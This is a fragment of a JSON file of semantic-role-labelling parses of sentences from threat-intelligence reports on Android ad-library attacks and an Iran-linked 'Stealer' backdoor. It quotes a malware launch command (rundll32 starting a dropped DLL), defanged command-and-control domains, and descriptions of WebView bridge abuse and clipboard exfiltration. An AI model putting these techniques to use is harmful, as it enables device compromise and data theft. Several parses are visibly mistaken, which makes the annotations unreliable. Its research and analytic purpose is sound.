{"text": "\u2022 3d26442f06b34df3d5921f89bf680ee9"}, "V": {"text": "bundled", "index": 3}, "ARG2": {"text": "with an installer for Gerdoovpn virtual private network software"}}}, " We also found incomplete code that would\nperform SFTP and SMTP exfiltration, which could         \nbe completed in a future version": {"found": {"ARG0": {"text": "We"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "found", "index": 2}, "ARG1": {"text": "incomplete code that would perform SFTP and SMTP exfiltration , which could be completed in a future version"}}, "would": {"V": {"text": "would", "index": 6}}, "perform": {"ARG0": {"text": "incomplete code"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "perform", "index": 7}, "ARG1": {"text": "SFTP and SMTP exfiltration , which could be completed in a future version"}}, "could": {"V": {"text": "could", "index": 14}}, "be": {"V": {"text": "be", "index": 15}}, "completed": {"ARG1": {"text": "SFTP and SMTP exfiltration"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "completed", "index": 16}, "ARGM-LOC": {"text": "in a future version"}}}, " It drops and launches AppTransferWiz.dll\nvia the following command:\n<list>\n\u201cC:\\WINDOWS\\system32\\rundll32.exe\u201d \u201cC:\\\nDocuments and Settings\\{USER}\\Application\n\nData\\IntelRapidStart\\AppTransferWiz.dll\u201d,#110\n</list>\n110 is an ordinal that corresponds to \u201cStartBypass\u201d\nexport in AppTransferWiz.dll": {"drops": {"ARG0": {"text": "It"}, "V": {"text": "drops", "index": 1}, "ARGM-MNR": {"text": "via the following command"}}, "launches": {"ARG0": {"text": "It"}, "V": {"text": "launches", "index": 3}, "ARG1": {"text": "AppTransferWiz.dll"}, "ARGM-MNR": {"text": "via"}}, "following": {"V": {"text": "following", "index": 7}, "ARG1": {"text": "command"}}, "is": {"ARG1": {"text": "110"}, "V": {"text": "is", "index": 11}, "ARG2": {"text": "an ordinal that corresponds to \u201c StartBypass \u201d export in AppTransferWiz.dll"}}, "corresponds": {"ARG1": {"text": "an ordinal"}, "R-ARG1": {"text": "that"}, "V": {"text": "corresponds", "index": 15}, "ARG2": {"text": "to \u201c StartBypass \u201d export in AppTransferWiz.dll"}}, "\u201c": {"ARG0": {"text": "an"}, "R-ARG0": {"text": "that"}, "V": {"text": "\u201c", "index": 17}, "ARG1": {"text": "StartBypass \u201d export"}}}, "                                                        \n\nAnalysis of the malware indicates that the data is\nencrypted via a Rijndael cipher implementation;\nmore specifically it uses AES which is a specific set\nof configurations of Rijndael": {"indicates": {"ARG0": {"text": "Analysis of the malware"}, "V": {"text": "indicates", "index": 4}, "ARG1": {"text": "that the data is encrypted via a Rijndael cipher implementation"}}, "is": {"ARG1": {"text": "the data"}, "V": {"text": "is", "index": 8}, "ARG2": {"text": "encrypted"}}, "encrypted": {"ARG1": {"text": "the data"}, "V": {"text": "encrypted", "index": 9}, "ARGM-MNR": {"text": "via a Rijndael cipher implementation"}}, "uses": {"ARGM-ADV": {"text": "more specifically"}, "ARG0": {"text": "it"}, "V": {"text": "uses", "index": 19}, "ARG1": {"text": "AES which is a specific set of configurations of Rijndael"}}, "is_2": {"ARG1": {"text": "AES"}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 22}, "ARG2": {"text": "a specific set of configurations of Rijndael"}}}, " During that time period, the Chinese\nhacking community engaged in website\ndefacements and denial of service attacks in\nconjunction with incidents such as the accidental\nbombing of the Chinese embassy in Belgrade in\n1999, the collision of a U.S": {"hacking": {"V": {"text": "hacking", "index": 7}, "ARG1": {"text": "community"}}, "engaged": {"ARGM-TMP": {"text": "During that time period"}, "ARG0": {"text": "the Chinese hacking community"}, "V": {"text": "engaged", "index": 9}, "ARG2": {"text": "in website defacements and denial of service attacks"}, "ARGM-MNR": {"text": "in conjunction with incidents such as the accidental bombing of the Chinese embassy in Belgrade in 1999"}, "ARGM-ADV": {"text": "the collision of a U.S"}}}, " This                  \nsample is a Stealer variant that connects to the\naforementioned intel-update[.]com as well as            \nplugin-adobe[.]com": {"is": {"ARG1": {"text": "This sample"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a Stealer variant that connects to the aforementioned intel - update[.]com as well as plugin - adobe[.]com"}}, "connects": {"ARG0": {"text": "a Stealer variant"}, "R-ARG0": {"text": "that"}, "V": {"text": "connects", "index": 7}, "ARG1": {"text": "to the aforementioned intel - update[.]com as well as plugin - adobe[.]com"}}}, " Other domains\nseen resolving to IP address nearby include the         \nfollowing:                                              \n                                                        \nAside from the sample connecting to plugin-             \nadobe[.]com, we have not discovered any malware\nconnecting to these domains": {"seen": {"V": {"text": "seen", "index": 2}, "ARG1": {"text": "resolving to IP address nearby"}}, "resolving": {"V": {"text": "resolving", "index": 3}, "ARGM-PRP": {"text": "to IP address nearby"}}, "include": {"ARG2": {"text": "Other domains seen resolving to IP address nearby"}, "V": {"text": "include", "index": 8}, "ARG1": {"text": "the following : Aside from the sample connecting to plugin- adobe[.]com , we have not discovered any malware connecting to these domains"}}, "following": {"V": {"text": "following", "index": 10}}, "connecting": {"V": {"text": "connecting", "index": 16}, "ARG2": {"text": "to plugin- adobe[.]com"}}, "have": {"V": {"text": "have", "index": 22}}, "discovered": {"ARGM-ADV": {"text": "Aside from the sample connecting to plugin- adobe[.]com"}, "ARG0": {"text": "we"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "discovered", "index": 24}, "ARG1": {"text": "any malware connecting to these domains"}}, "connecting_2": {"ARG1": {"text": "any malware"}, "V": {"text": "connecting", "index": 27}, "ARG2": {"text": "to these domains"}}}, " This\nmodel is consistent with the Basij\u2019s recruitment of\nparamilitary volunteer hackers to \u201cengage in less\ncomplex hacking or infiltration operations\u201d leaving\nthe more technical operations to entities over\nwhich they have increasingly direct control.<fn>13</fn>\n\nAs such, the capabilities of threat actors operating\nfrom Iran have traditionally been considered\nlimited.<fn>14</fn> However, the \u201cShamoon\u201d attacks, which\nwiped computers in Saudi Arabia and Qatar,\nindicate an improvement in capabilities.<fn>15</fn> And\nunsurprisingly, Iran has reportedly increased its\nefforts to improve offensive capabilities after\nbeing targeted by Stuxnet and Flame.<fn>16</fn>\n</section>\n\n<footnote>\n5\t   Elegant, S": {"is": {"ARG1": {"text": "This model"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "consistent with the Basij \u2019s recruitment of paramilitary volunteer hackers to \u201c engage in less complex hacking or infiltration operations \u201d leaving the more technical operations to entities over which they have increasingly direct control . 5 Elegant , S"}}, "engage": {"ARG0": {"text": "the Basij \u2019s recruitment of paramilitary volunteer hackers"}, "V": {"text": "engage", "index": 15}, "ARG2": {"text": "in less complex hacking"}}, "leaving": {"ARG0": {"text": "the Basij \u2019s recruitment of paramilitary volunteer hackers"}, "V": {"text": "leaving", "index": 24}, "ARG1": {"text": "the more technical operations"}, "ARG2": {"text": "to entities over which they have increasingly direct control . 5 Elegant , S"}}, "have": {"ARG1": {"text": "entities/ increasingly"}, "R-ARG1": {"text": "which"}, "ARG0": {"text": "they"}, "V": {"text": "have", "index": 34}}}, "                                  \n\n The Builder option enables an attacker to\n configure a new Stealer backdoor": {"enables": {"ARG0": {"text": "The Builder option"}, "V": {"text": "enables", "index": 3}, "ARG1": {"text": "an attacker to configure a new Stealer backdoor"}}, "configure": {"ARG0": {"text": "an attacker"}, "V": {"text": "configure", "index": 7}, "ARG1": {"text": "a new Stealer"}, "ARGM-ADV": {"text": "backdoor"}}}, "                                       \n</section>\n<section>                                                       \n<heading>Spoofed Installers</heading>\nMany of the malicious executables (droppers) that\nwe collected were bundled with legitimate\ninstallers for VPN or proxy software": {"collected": {"ARG0": {"text": "we"}, "V": {"text": "collected", "index": 10}, "ARG2": {"text": "VPN or proxy software"}}, "were": {"ARG1": {"text": "we collected"}, "V": {"text": "were", "index": 11}, "ARG2": {"text": "bundled with legitimate installers for VPN or proxy software"}}, "bundled": {"ARG1": {"text": "we collected"}, "V": {"text": "bundled", "index": 12}, "ARG2": {"text": "with legitimate installers for VPN or proxy software"}}}, "\n\nThese droppers were also designed to visually\nspoof the appearance of the above applications": {"were": {"V": {"text": "were", "index": 2}}, "designed": {"ARG1": {"text": "These droppers"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "designed", "index": 4}, "ARG3": {"text": "to visually spoof the appearance of the above applications"}}, "spoof": {"ARG0": {"text": "These droppers"}, "ARGM-MNR": {"text": "visually"}, "V": {"text": "spoof", "index": 7}, "ARG1": {"text": "the appearance of the above applications"}}}, " However, with this information, an                               \nattacker can precisely locate the victim and                                 \nacquire the device\u2019s specifications": {"can": {"V": {"text": "can", "index": 8}}, "locate": {"ARGM-DIS": {"text": "However"}, "ARGM-ADV": {"text": "with this information"}, "ARG0": {"text": "an attacker"}, "ARGM-MOD": {"text": "can"}, "ARGM-MNR": {"text": "precisely"}, "V": {"text": "locate", "index": 10}, "ARG1": {"text": "the victim"}}, "acquire": {"ARGM-DIS": {"text": "However"}, "ARGM-ADV": {"text": "with this information/ precisely"}, "ARG0": {"text": "an attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "acquire", "index": 14}, "ARG1": {"text": "the device \u2019s specifications"}}}, "\n\nEven if the attackers can\u2019t obtain root, they can\nattempt ptrace <fn>10</fn> to control the host app": {"obtain": {"ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "ca"}, "ARGM-NEG": {"text": "n\u2019t"}, "V": {"text": "obtain", "index": 6}, "ARG1": {"text": "root"}}, "can": {"ARGM-ADV": {"text": "Even if the attackers ca n\u2019t obtain root"}, "V": {"text": "can", "index": 10}, "ARG1": {"text": "attempt ptrace to control the host app"}}, "attempt": {"ARGM-ADV": {"text": "Even if the attackers ca n\u2019t obtain root"}, "ARG0": {"text": "they"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "attempt", "index": 11}, "ARG1": {"text": "ptrace to control the host app"}}, "control": {"ARG0": {"text": "ptrace"}, "V": {"text": "control", "index": 14}, "ARG1": {"text": "the host app"}}}, " Aggressive ad                                    \nlibraries also leak the user\u2019s private information": {"leak": {"ARG0": {"text": "Aggressive ad libraries"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "leak", "index": 4}, "ARG1": {"text": "the user \u2019s private information"}}}, " As\nshown in Listing 5, an attacker can load\nexecutables compiled from JNI code": {"shown": {"V": {"text": "shown", "index": 1}, "ARGM-MNR": {"text": "in Listing 5"}}, "can": {"ARGM-ADV": {"text": "As shown in Listing 5"}, "ARG0": {"text": "an attacker"}, "V": {"text": "can", "index": 8}, "ARG1": {"text": "load"}}, "load": {"ARGM-ADV": {"text": "As shown in Listing 5"}, "ARG0": {"text": "an attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "load", "index": 9}, "ARG2": {"text": "executables compiled"}, "ARG1": {"text": "from JNI code"}}, "compiled": {"V": {"text": "compiled", "index": 11}, "ARG0": {"text": "from JNI code"}}}, " root exploits)  16,579          11,706M         4,201         3,207M\n</table>\n</section>  \n\n<footer>14 www.fireeye.com</footer>\n\f\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n<section>\n<heading>Conclusion</heading>\nIn the current golden age of Android ad              \nlibraries, Sidewinder Targeted Attacks can           \ntarget victims using info leakage and other          \nvulnerabilities of ad libraries to get valuable,     \nsensitive information": {"Targeted": {"ARG2": {"text": "Sidewinder"}, "V": {"text": "Targeted", "index": 20}, "ARG1": {"text": "Attacks"}}, "can": {"V": {"text": "can", "index": 22}}, "target": {"ARG0": {"text": "Sidewinder Targeted Attacks"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "target", "index": 23}, "ARG1": {"text": "victims"}, "ARG2": {"text": "using info leakage and other vulnerabilities of ad libraries to get valuable , sensitive information"}}, "using": {"ARG0": {"text": "victims"}, "V": {"text": "using", "index": 25}, "ARG1": {"text": "info leakage and other vulnerabilities of ad libraries"}, "ARG2": {"text": "to get valuable"}}, "get": {"V": {"text": "get", "index": 35}, "ARG2": {"text": "valuable"}}}, "\n\nTable 1 proposes different attacks that an\nattacker can launch remotely on target devices\nthrough vulnerable ad libraries": {"proposes": {"ARG0": {"text": "Table 1"}, "V": {"text": "proposes", "index": 2}, "ARG1": {"text": "different attacks that an attacker can launch remotely on target devices through vulnerable ad libraries"}}, "can": {"ARG0": {"text": "an attacker"}, "V": {"text": "can", "index": 8}, "ARGM-MNR": {"text": "launch remotely/ through vulnerable ad libraries"}, "ARGM-LOC": {"text": "on target devices"}}, "launch": {"ARG0": {"text": "an attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "launch", "index": 9}, "ARGM-MNR": {"text": "remotely/ through vulnerable ad libraries"}, "ARGM-LOC": {"text": "on target devices"}}}, " The right                      \npanel lists all information stolen from the                       \nvictim\u2019s device": {"lists": {"ARG0": {"text": "The right panel"}, "V": {"text": "lists", "index": 3}, "ARG1": {"text": "all information stolen from the victim \u2019s device"}}, "stolen": {"ARG1": {"text": "all information"}, "V": {"text": "stolen", "index": 6}, "ARG2": {"text": "from the victim \u2019s device"}}}, " If an app containing such                                \nvulnerability has sensitive Android permissions                                  \nsuch as access to the camera, a remote attacker                                  \ncould exploit it to perform sensitive tasks such as                              \ntaking photos or recording video, over the                                       \nInternet, without consent": {"containing": {"ARG0": {"text": "an app"}, "V": {"text": "containing", "index": 3}, "ARG1": {"text": "such vulnerability"}}, "has": {"ARG0": {"text": "an app containing such vulnerability"}, "V": {"text": "has", "index": 6}, "ARG1": {"text": "sensitive Android permissions such as access to the camera"}}, "could": {"ARGM-ADV": {"text": "If an app containing such vulnerability has sensitive Android permissions such as access to the camera"}, "V": {"text": "could", "index": 20}}, "exploit": {"ARGM-ADV": {"text": "If an app containing such vulnerability has sensitive Android permissions such as access to the camera"}, "ARG0": {"text": "a remote attacker"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "exploit", "index": 21}, "ARG1": {"text": "it"}, "ARG2": {"text": "to perform sensitive tasks such as taking photos or recording video , over the Internet , without consent"}}, "perform": {"ARG0": {"text": "a remote attacker"}, "V": {"text": "perform", "index": 24}, "ARG1": {"text": "sensitive tasks such as taking photos or recording video , over the Internet"}, "ARGM-MNR": {"text": "without consent"}}, "taking": {"V": {"text": "taking", "index": 29}, "ARG1": {"text": "photos or recording video , over the Internet"}, "ARGM-MNR": {"text": "without consent"}}}, "\n</section>\n\n<section>                                                                         \n<heading>Detonation without Android Context</heading>                                       \nAfter getting local access, the attacker can upload                      \nprivate and sensitive files from the victim\u2019s device,                    \nor modify files that the host app can write to (e.g.,                    \nthe directory of the host app and SD Card with                           \nFAT file system)": {"getting": {"V": {"text": "getting", "index": 1}, "ARG1": {"text": "local access"}}, "can": {"ARGM-TMP": {"text": "After getting local access"}, "ARG0": {"text": "the attacker"}, "V": {"text": "can", "index": 7}, "ARG2": {"text": "from the victim \u2019s device"}}, "upload": {"ARGM-TMP": {"text": "After getting local access"}, "ARG0": {"text": "the attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "upload", "index": 8}, "ARG1": {"text": "private and sensitive files"}, "ARG2": {"text": "from the victim \u2019s device"}}, "modify": {"ARGM-TMP": {"text": "After getting local access"}, "ARG0": {"text": "the attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "modify", "index": 20}, "ARG1": {"text": "files"}, "ARGM-PRD": {"text": "that the host app can write to ( e.g. , the directory of the host app and SD Card with FAT file system )"}}, "can_2": {"V": {"text": "can", "index": 26}}, "write": {"ARG0": {"text": "the host app"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "write", "index": 27}, "ARG2": {"text": "to ( e.g. , the directory of the host app and SD Card with FAT file system )"}}}, "\n\n</footnote>\n\n\n<footer>7 www.fireeye.com</footer>\n\f\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n\nTo make calls from the Javascript bridge                                       \nwithout user consent, we can invoke the                                        \ntelephony service to dial numbers directly via                                 \nbinder, as shown in Listing 3, where phone is\nthe remote Android telephony service and the                                   \nnumber 2 represents the second remote call": {"make": {"V": {"text": "make", "index": 1}, "ARG1": {"text": "calls from the Javascript bridge without user consent"}, "ARG0": {"text": "we"}}, "can": {"V": {"text": "can", "index": 12}}, "invoke": {"R-ARG0": {"text": "To make calls from the Javascript bridge without user consent"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "invoke", "index": 13}, "ARG1": {"text": "the telephony service to dial numbers directly via binder"}, "ARGM-ADV": {"text": "as shown in Listing 3 , where phone is the remote Android telephony service and the number 2 represents the second remote call"}}, "dial": {"V": {"text": "dial", "index": 18}, "ARG1": {"text": "numbers"}, "ARGM-MNR": {"text": "directly/ via binder"}}, "shown": {"V": {"text": "shown", "index": 25}, "ARGM-LOC": {"text": "in Listing 3 , where phone is the remote Android telephony service and the number 2 represents the second remote call"}}, "is": {"ARGM-LOC": {"text": "Listing 3"}, "R-ARGM-LOC": {"text": "where"}, "ARG1": {"text": "phone"}, "V": {"text": "is", "index": 32}, "ARG2": {"text": "the remote Android telephony service"}}, "represents": {"ARG0": {"text": "the number 2"}, "V": {"text": "represents", "index": 42}, "ARG1": {"text": "the second remote call"}}}, "  \n\n</section>\n<section>                                                                \n\n<heading>Clipboard Monitoring nd Tampering</heading>                                             \nWith the Android context, an attacker can                                     \nmonitor or tamper with the clipboard": {"can": {"V": {"text": "can", "index": 7}}, "monitor": {"ARGM-ADV": {"text": "With the Android context"}, "ARG0": {"text": "an attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "monitor", "index": 8}, "ARG2": {"text": "with the clipboard"}}, "tamper": {"ARGM-ADV": {"text": "With the Android context"}, "ARG0": {"text": "an attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "tamper", "index": 10}, "ARG1": {"text": "with the clipboard"}}}, " Combined                                    \nwith the launcher modification attack introduced\nearlier, the attackers can redirect other app icons                          \n(e.g., bank or email app icons) to the phishing app                          \nand steal the user\u2019s login credentials": {"Combined": {"V": {"text": "Combined", "index": 0}, "ARG2": {"text": "with the launcher modification attack introduced earlier"}, "ARG1": {"text": "the attackers"}}, "introduced": {"ARG1": {"text": "the launcher modification attack"}, "V": {"text": "introduced", "index": 6}, "ARGM-TMP": {"text": "earlier"}}, "can": {"V": {"text": "can", "index": 11}}, "redirect": {"ARGM-PRD": {"text": "Combined with the launcher modification attack introduced earlier"}, "ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "redirect", "index": 12}, "ARG1": {"text": "other app icons ( e.g. , bank or email app icons ) to the phishing app"}}, "phishing": {"V": {"text": "phishing", "index": 27}, "ARG1": {"text": "app"}}, "steal": {"ARGM-PRD": {"text": "Combined with the launcher modification attack introduced earlier"}, "ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "steal", "index": 30}, "ARG1": {"text": "the user \u2019s login credentials"}}}, "\n19\n</footnote>\n</section>\n\n\n<footer>10 www.fireeye.com</footer>\n\f\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n<section>\n<heading>Stealthy App Installation by Abusing                                         \nCredentials</heading>                                                                  \nWith both the GET ACCOUNTS and the USE                                       \nCREDENTIALS permissions, Android pro- cesses                                 \ncan get secret tokens of services (e.g., Google                              \nservices) from the AccountManager and use them                               \nto authenticate to these services<fn>20</fn>": {}, "\nAttackers may rent servers close to the target\nservers, and use fake ARP packets to direct all the\ntraffic to go through the hijacking servers first for\nmonitoring and hijacking..ARP hijacking is a\nwell-known approach used in network attacks": {"may": {"V": {"text": "may", "index": 1}}, "rent": {"ARG0": {"text": "Attackers"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "rent", "index": 2}, "ARG1": {"text": "servers"}, "ARG2": {"text": "close to the target servers"}}, "use": {"ARG0": {"text": "Attackers"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "use", "index": 11}, "ARG1": {"text": "fake ARP packets"}, "ARG2": {"text": "to direct all the traffic to go through the hijacking servers first for monitoring and hijacking"}}, "direct": {"ARG0": {"text": "fake ARP packets"}, "V": {"text": "direct", "index": 16}, "ARG1": {"text": "all the traffic"}, "ARG2": {"text": "to go through the hijacking servers first for monitoring and hijacking"}}, "go": {"ARG0": {"text": "fake ARP packets"}, "V": {"text": "go", "index": 21}, "ARG2": {"text": "through the hijacking servers first for monitoring and hijacking"}}, "is": {"ARG1": {"text": "ARP hijacking"}, "V": {"text": "is", "index": 34}, "ARG2": {"text": "a well - known approach used in network attacks"}}, "known": {"ARGM-EXT": {"text": "well"}, "V": {"text": "known", "index": 38}, "ARG1": {"text": "approach"}}, "used": {"ARG1": {"text": "a well - known approach"}, "V": {"text": "used", "index": 40}, "ARGM-LOC": {"text": "in network attacks"}}}, " As noted by Google: \u201cUse\nof this method in a WebView containing\nuntrusted content could allow an attacker to\nmanipulate the host application in unintended\nways, executing Java code with the permissions\nof the host application.\u201d<fn>3</fn>\n\nIn particular, if an app running on Android API 16\nor below uses the JavaScript binding method\naddJavascriptInterface and loads the content\nin the WebView over HTTP, an attacker over the\nnetwork could hijack the HTTP traffic (e.g.,\nthrough WiFi or DNS hijacking) to inject\nmalicious content into the WebView and to\ncontrol the host application": {"noted": {"V": {"text": "noted", "index": 1}, "ARG0": {"text": "by Google"}}, "containing": {"ARG0": {"text": "a WebView"}, "V": {"text": "containing", "index": 13}, "ARG1": {"text": "untrusted content"}}, "could": {"V": {"text": "could", "index": 16}}, "allow": {"ARG0": {"text": "\u201c Use of this method in a WebView containing untrusted content"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "allow", "index": 17}, "ARG1": {"text": "an attacker to manipulate the host application in unintended ways"}, "ARGM-ADV": {"text": "executing Java code with the permissions of the host application"}}, "manipulate": {"ARG0": {"text": "an attacker"}, "V": {"text": "manipulate", "index": 21}, "ARG1": {"text": "the host application"}, "ARGM-MNR": {"text": "in unintended ways"}}, "executing": {"V": {"text": "executing", "index": 29}, "ARG1": {"text": "Java code"}, "ARG2": {"text": "with the permissions of the host application"}}, "running": {"ARG0": {"text": "an app"}, "V": {"text": "running", "index": 47}, "ARG1": {"text": "on Android API 16"}}, "loads": {"ARG0": {"text": "an app running on Android API 16 or below uses the JavaScript binding method"}, "V": {"text": "loads", "index": 61}, "ARG1": {"text": "the content"}, "ARG2": {"text": "in the WebView/ over HTTP/ over"}}, "could_2": {"ARG1": {"text": "an attacker"}, "ARG0": {"text": "the network"}, "V": {"text": "could", "index": 75}}, "hijack": {"ARGM-ADV": {"text": "As noted by Google/ \u201c Use of this method in a WebView containing untrusted content could allow an attacker to/ Java code with the permissions of the host application . \u201d In particular/ if an app running on Android API 16 or below uses the JavaScript binding method addJavascriptInterface and loads the content in"}, "ARG0": {"text": "an attacker/ over the network"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "hijack", "index": 76}, "ARG1": {"text": "the HTTP traffic ( e.g."}}, "inject": {"V": {"text": "inject", "index": 90}, "ARG1": {"text": "malicious content"}, "ARG2": {"text": "into the WebView"}}, "control": {"ARG0": {"text": "an attacker/ the network"}, "V": {"text": "control", "index": 98}, "ARG1": {"text": "the host application"}}}, "\n</footnote>\n\n\n\n<footer>3 www.fireeye.com</footer>\n\f\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n\nincluding uploading local files, taking pictures,                 \nrecording audio/video, manipulating the                           \nclipboard, sending SMS, dialing numbers,                          \nimplanting bootkit, or installing the attacker\u2019s                  \napps uploaded to Google Play, etc": {"including": {"V": {"text": "including", "index": 0}}, "uploading": {"V": {"text": "uploading", "index": 1}, "ARG1": {"text": "local files"}}, "taking": {"V": {"text": "taking", "index": 5}, "ARG1": {"text": "pictures , recording audio / video"}}, "recording": {"V": {"text": "recording", "index": 8}, "ARG0": {"text": "audio / video"}}, "manipulating": {"V": {"text": "manipulating", "index": 13}, "ARG1": {"text": "the clipboard"}}, "sending": {"V": {"text": "sending", "index": 17}, "ARG1": {"text": "SMS"}}, "implanting": {"V": {"text": "implanting", "index": 23}, "ARG1": {"text": "bootkit"}}, "installing": {"V": {"text": "installing", "index": 27}, "ARG1": {"text": "the attacker \u2019s apps uploaded"}, "ARG2": {"text": "to Google Play"}, "ARGM-DIS": {"text": "etc"}}, "uploaded": {"ARG1": {"text": "the attacker \u2019s apps"}, "V": {"text": "uploaded", "index": 32}, "ARG2": {"text": "to Google Play"}}}, " However, if an ad library uses the\n@JavascriptInterface annotation to expose\nsecurity-sensitive interfaces, and uses HTTP to\nload content in the WebView, it is vulnerable to\nattacks where an attacker over the network\ncould inject malicious content into the WebView\nto misuse the interfaces exposed through the JS\nbinding annotation": {"uses": {"ARG0": {"text": "an ad library"}, "V": {"text": "uses", "index": 6}, "ARG1": {"text": "the @JavascriptInterface annotation"}, "ARG2": {"text": "to expose security - sensitive interfaces"}}, "expose": {"ARG0": {"text": "an ad library"}, "V": {"text": "expose", "index": 11}, "ARG1": {"text": "security - sensitive interfaces"}}, "uses_2": {"ARG0": {"text": "an ad library"}, "V": {"text": "uses", "index": 18}, "ARG1": {"text": "HTTP"}, "ARG2": {"text": "to load content in the WebView"}}, "load": {"ARG0": {"text": "an ad library"}, "V": {"text": "load", "index": 21}, "ARG2": {"text": "content"}, "ARG1": {"text": "in the WebView"}}, "is": {"ARGM-DIS": {"text": "However"}, "ARGM-ADV": {"text": "if an ad library uses the @JavascriptInterface annotation to expose security - sensitive interfaces , and uses HTTP to load content in the WebView"}, "V": {"text": "is", "index": 28}, "ARG2": {"text": "vulnerable"}, "ARG1": {"text": "to attacks where an attacker over the network could inject malicious content into the WebView to misuse the interfaces exposed through the JS binding annotation"}}, "could": {"ARGM-LOC": {"text": "where/ inject"}, "ARG0": {"text": "an attacker over the network"}, "V": {"text": "could", "index": 38}, "ARG1": {"text": "malicious content into the WebView"}, "ARGM-PRP": {"text": "to misuse the interfaces exposed through the JS binding annotation"}}, "inject": {"ARGM-LOC": {"text": "where"}, "ARG0": {"text": "an attacker over the network"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "inject", "index": 39}, "ARG1": {"text": "malicious content"}, "ARG2": {"text": "into the WebView"}, "ARGM-PRP": {"text": "to misuse the interfaces exposed through the JS binding annotation"}}, "misuse": {"V": {"text": "misuse", "index": 46}, "ARG1": {"text": "the interfaces exposed through the JS binding annotation"}}, "exposed": {"ARG1": {"text": "the interfaces"}, "V": {"text": "exposed", "index": 49}, "ARG2": {"text": "through the JS binding annotation"}}, "binding": {"V": {"text": "binding", "index": 53}, "ARG0": {"text": "annotation"}}}, " Any UID has the capability                              \nto manipulate clipboard via the API calls in Listing 6:                       \n\n\nUsing these APIs, the attackers can monitor\nchanges to a clipboard and transfer the\nclipboard contents to some remote server": {"has": {"ARG0": {"text": "Any UID"}, "V": {"text": "has", "index": 2}, "ARG1": {"text": "the capability to manipulate clipboard via the API calls in Listing 6"}}, "manipulate": {"V": {"text": "manipulate", "index": 6}, "ARG1": {"text": "clipboard"}, "ARGM-MNR": {"text": "via the API calls in Listing 6"}}, "calls": {"ARG0": {"text": "manipulate clipboard via the API"}, "V": {"text": "calls", "index": 11}, "ARG1": {"text": "Listing 6"}}, "Listing": {"V": {"text": "Listing", "index": 13}, "ARG1": {"text": "6"}}, "Using": {"V": {"text": "Using", "index": 16}, "ARG1": {"text": "these APIs"}}, "can": {"V": {"text": "can", "index": 22}}, "monitor": {"R-ARG0": {"text": "Using these APIs"}, "ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "monitor", "index": 23}, "ARG1": {"text": "changes"}, "ARG2": {"text": "to a clipboard"}}, "transfer": {"ARGM-MNR": {"text": "Using these APIs"}, "ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "transfer", "index": 29}, "ARG1": {"text": "the clipboard contents"}, "ARG2": {"text": "to some remote server"}}}, " The left panel enables the\nattacker to command the victim's device,\n\n<footnote>\n1\n \t Ranjit Atwal, Lillian Tay, Roberta Cozza, Tuong Huy Nguyen, Tracy Tsai, Annette Zimmermann, and CK Lu": {"enables": {"ARG0": {"text": "The left panel"}, "V": {"text": "enables", "index": 3}, "ARG2": {"text": "the attacker"}, "ARG1": {"text": "to command the victim 's device , 1 Ranjit Atwal , Lillian Tay , Roberta Cozza , Tuong Huy Nguyen , Tracy Tsai , Annette Zimmermann , and CK Lu"}}, "command": {"ARG0": {"text": "the attacker"}, "V": {"text": "command", "index": 7}, "ARG1": {"text": "the victim 's device , 1 Ranjit Atwal , Lillian Tay , Roberta Cozza , Tuong Huy Nguyen , Tracy Tsai , Annette Zimmermann , and CK Lu"}}}, " Attackers keep a     \nlow profile by allowing all other irrelevant            \nnetwork traffic to pass without being modified": {"keep": {"ARG0": {"text": "Attackers"}, "V": {"text": "keep", "index": 1}, "ARG1": {"text": "a low profile"}, "ARGM-MNR": {"text": "by allowing all other irrelevant network traffic to pass without being modified"}}, "allowing": {"ARG0": {"text": "Attackers"}, "V": {"text": "allowing", "index": 6}, "ARG1": {"text": "all other irrelevant network traffic to pass without being modified"}}, "pass": {"ARG1": {"text": "all other irrelevant network traffic"}, "V": {"text": "pass", "index": 13}, "ARGM-MNR": {"text": "without being modified"}}, "being": {"V": {"text": "being", "index": 15}}, "modified": {"V": {"text": "modified", "index": 16}}}, " If the attackers can hijack                      \nthe communication channels and inject malicious                          \nDEX files, they can then control the behaviors of                        \nthe victim apps": {"can": {"V": {"text": "can", "index": 3}}, "hijack": {"ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "hijack", "index": 4}, "ARG1": {"text": "the communication channels and inject malicious DEX files"}}, "inject": {"ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "inject", "index": 9}, "ARG1": {"text": "malicious DEX files"}}, "can_2": {"V": {"text": "can", "index": 15}}, "control": {"ARGM-ADV": {"text": 